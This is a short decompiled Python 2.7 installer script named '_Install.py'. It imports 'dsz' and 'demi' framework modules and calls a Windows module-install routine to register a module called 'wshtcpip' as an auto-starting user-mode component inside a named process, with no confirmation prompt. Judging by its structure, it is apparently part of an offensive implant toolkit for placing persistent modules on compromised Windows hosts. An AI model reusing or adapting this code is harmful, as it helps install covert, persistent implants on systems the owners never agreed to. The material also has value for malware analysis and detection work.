# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _Install.py
import dsz
import dsz.lp
dsz.lp.AddResDirToPath('DeMi')
import demi
import demi.registry
import demi.windows.module
import glob
import os
import re
import shutil
import sys

def main():
    dsz.control.echo.Off()
    if len(sys.argv) != 3:
        dsz.ui.Echo('* Invalid parameters', dsz.ERROR)
        dsz.ui.Echo()
        dsz.ui.Echo('Usage:  %s <localFile> <procName>' % sys.argv[0])
        return False
    localFile = sys.argv[1]
    procName = sys.argv[2]
    return demi.windows.module.Install('Pc', localFile, 'wshtcpip', demi.registry.PC.Id, 1, 'Auto_Start|User_Mode', procName, ask=False)


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)